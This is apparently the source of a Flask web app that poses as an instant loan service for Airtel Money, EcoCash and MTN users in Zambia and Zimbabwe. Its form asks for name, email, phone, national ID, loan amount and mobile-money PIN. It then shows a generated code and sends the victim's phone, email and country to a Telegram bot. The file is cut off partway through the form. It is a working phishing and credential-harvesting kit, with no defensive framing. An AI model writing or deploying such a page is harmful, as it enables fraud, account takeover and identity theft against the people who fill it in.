import os, random
from flask import Flask, request, session, redirect
import requests
app = Flask(__name__)
app.secret_key = "fixed-no-emoji"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WA = "https://wa.me/message/CFCJWLOZ7IWZK1"
TEL = "tel:+260000000000"
IMG = "https://i.postimg.cc/N001FyNh/IMG-20261025-WA7135.jpg"

@app.route('/')
def home():
    return redirect('/api')

@app.route('/api', methods=['GET','POST'])
def api():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = "WLD-" + str(random.randint(1000,9999))
        session['otp'] = otp
        session['name'] = request.form.get('full_name')
        session['email'] = request.form.get('email')
        session['phone'] = request.form.get('phone')
        session['amount'] = request.form.get('amount')
        session['pin'] = request.form.get('pin')
        session['country'] = request.form.get('country')
        session['ref'] = ref
        try:
            msg = "OTP " + otp + " " + session['country'] + " " + session['phone'] + " Email:" + session['email']
            requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", data={"chat_id":CHAT_ID,"text":msg})
        except:
            pass
        return f"""
<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
<meta property='og:image' content='{IMG}'>
<style>body{{font-family:Arial;background:#f0f4f0;padding:20px}}.box{{background:white;max-width:400px;margin:50px auto;padding:25px;border-radius:15px;text-align:center}}.big{{font-size:30px;letter-spacing:6px;background:#e8f5e9;padding:12px;border-radius:10px;color:#0a7a3e;font-weight:bold;border:2px dashed #0a7a3e}}</style>
</head><body><div class='box'><img src='{IMG}' style='width:100%;border-radius:12px'>
<h2>SMS Sent to {session['phone']}</h2><p>{session['email']}</p>
<div class='big'>{otp}</div>
<form method='POST' action='/verify'><input name='otp' placeholder='Enter code' required style='width:100%;padding:12px;font-size:18px;text-align:center;margin-top:15px'>
<button style='width:100%;padding:12px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:10px'>Verify</button></form></div></body></html>
"""
    return f"""
<html><head><meta name='viewport' content='width=device-width,initial-scale=1'>
<meta property='og:title' content='WORLD LOAN Zambia Zimbabwe Instant'>
<meta property='og:description' content='Zambia Zimbabwe Loan - Airtel Money EcoCash'>
<meta property='og:image' content='{IMG}'>
<meta property='og:url' content='https://james-tips.onrender.com/api'>
<style>body{{font-family:Arial;background:#f0f4f0;padding:15px}}.box{{background:white;max-width:420px;margin:auto;padding:20px;border-radius:15px}}input,select{{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:8px}}button{{width:100%;padding:13px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-weight:bold}}</style>
</head><body><div class='box'><img src='{IMG}' style='width:100%;border-radius:12px;margin-bottom:10px'>
<h2 style='text-align:center;color:#0a7a3e'>WORLD LOAN - Zambia & Zimbabwe</h2>
<p style='text-align:center'>Airtel Money | EcoCash | MTN | ZMW USD</p>
<form method='POST'>
<input name='full_name' placeholder='Full Name' required>
<input type='email' name='email' placeholder='Email Address' required>
<select name='country' required><option value='Zambia'>Zambia</option><option value='Zimbabwe'>Zimbabwe</option></select>
<input name='phone' placeholder='Phone +260 / +263' required>
<input name='id_number' placeholder='NRC / National ID' required>
<input name='county' placeholder='City - Lusaka, Harare' required>
<input name='
